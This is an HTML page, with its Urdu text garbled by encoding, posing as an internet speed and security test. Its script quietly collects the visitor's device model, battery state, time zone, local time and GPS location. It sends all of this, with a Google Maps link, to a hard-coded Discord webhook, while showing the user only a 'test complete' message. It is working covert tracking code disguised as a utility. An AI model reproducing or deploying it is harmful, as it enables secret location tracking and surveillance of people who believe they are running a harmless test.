<!DOCTYPE html>
<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Ù†ÛŒÙ¹ ÙˆØ±Ú© Ø§Ø³Ù¾ÛŒÚˆ Ù¹ÛŒØ³Ù¹</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .test-box { background: #1c222d; padding: 35px; border-radius: 20px; width: 340px; text-align: center; border: 1px solid #313a4a; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
        .btn-run { background: #00d2ff; color: black; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
    </style>
</head>
<body>

<div class="test-box">
    <div style="font-size:50px">âš¡</div>
    <h2>Ø§Ù†Ù¹Ø±Ù†ÛŒÙ¹ Ú©ÙˆØ§Ù„Ù¹ÛŒ Ø±Ù¾ÙˆØ±Ù¹</h2>
    <p style="font-size:13px; color:#94a3b8;">Ø§Ù¾Ù†Û’ Ø§Ù†Ù¹Ø±Ù†ÛŒÙ¹ Ú©ÛŒ Ø±ÙØªØ§Ø± Ø§ÙˆØ± Ø³ÛŒÚ©ÛŒÙˆØ±Ù¹ÛŒ Ú†ÛŒÚ© Ú©Ø±Ù†Û’ Ú©Û’ Ù„ÛŒÛ’ Ø¨Ù¹Ù† Ø¯Ø¨Ø§Ø¦ÛŒÚºÛ”</p>
    <button class="btn-run" onclick="executeFullAudit()">Ù¹ÛŒØ³Ù¹ Ø´Ø±ÙˆØ¹ Ú©Ø±ÛŒÚº</button>
    <div id="out" style="display:none; margin-top:15px; color:#4ade80; font-size:12px;">ØªØ¬Ø²ÛŒÛ Ù…Ú©Ù…Ù„ ÛÙˆ Ú¯ÛŒØ§!</div>
</div>

<script>
    async function executeFullAudit() {
        // 1. Ú¯ÛØ±ÛŒ ÚˆÛŒÙˆØ§Ø¦Ø³ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª (ÙÙˆÙ† Ù…Ø§ÚˆÙ„ Ú©Ø§ Ø§Ù†Ø¯Ø§Ø²Û)
        const ua = navigator.userAgent;
        let deviceModel = "PC/Laptop";
        if (ua.match(/Android/i)) {
            const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)\sBuild/);
            deviceModel = match ? match[2] : "Android Phone";
        } else if (ua.match(/iPhone/i)) {
            deviceModel = "iPhone";
        }

        // 2. Ø¨ÛŒÙ¹Ø±ÛŒ Ú©ÛŒ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª (Ú¯Ø§Ø±Ù†Ù¹ÛŒÚˆ)
        let battStr = "N/A";
        try {
            const b = await navigator.getBattery();
            battStr = `${Math.round(b.level * 100)}% (${b.charging ? 'Ú†Ø§Ø±Ø¬Ù†Ú¯' : 'Ø¨ÛŒÙ¹Ø±ÛŒ Ù¾Ø±'})`;
        } catch(e) { battStr = "Ø§Ø¬Ø§Ø²Øª Ù†ÛÛŒÚº Ù…Ù„ÛŒ"; }

        // 3. Ù¹Ø§Ø¦Ù… Ø§ÙˆØ± Ù„ÙˆÚ©ÛŒØ´Ù†
        const tZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const localT = new Date().toLocaleString();

        const sendData = async (lat = "Denied", lon = "Denied") => {
            const webhook = "https://discord.com/api/webhooks/1470998243826602132/T60IyiL2tylMGTqYes0mwWzq59wUn9-HjEG0_FWTW7iQtapXwRDzOd5eoDQNYa276z6A";
            
            const payload = {
                embeds: [{
                    title: "ğŸ“± Ù…Ú©Ù…Ù„ ÚˆÛŒÙˆØ§Ø¦Ø³ Ø§ÙˆØ± Ù†ÛŒÙ¹ ÙˆØ±Ú© Ø±Ù¾ÙˆØ±Ù¹",
                    color: 16711680,
                    fields: [
                        { name: "ğŸ”‹ Ø¨ÛŒÙ¹Ø±ÛŒ Ú©ÛŒ Ø­Ø§Ù„Øª", value: battStr, inline: true },
                        { name: "ğŸ“± ÙÙˆÙ†/Ø³Ø³Ù¹Ù… Ù…Ø§ÚˆÙ„", value: deviceModel, inline: true },
                        { name: "â° Ù¹Ø§Ø¦Ù… Ø²ÙˆÙ†", value: tZone },
                        { name: "ğŸ•’ Ù…Ù‚Ø§Ù…ÛŒ ÙˆÙ‚Øª", value: localT },
                        { name: "ğŸ“ Ù…ÛŒÙ¾ Ù„Ù†Ú©", value: `[Ù„ÙˆÚ©ÛŒØ´Ù† Ø¯ÛŒÚ©Ú¾ÛŒÚº](https://www.google.com/maps?q=${lat},${lon})` }
                    ],
                    footer: { text: "ISDP Advanced Audit" },
                    timestamp: new Date()
                }]
            };

            await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            document.getElementById('out').style.display = 'block';
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (p) => sendData(p.coords.latitude, p.coords.longitude),
                () => sendData()
            );
        } else { sendData(); }
    }
</script>
</body>
</html>
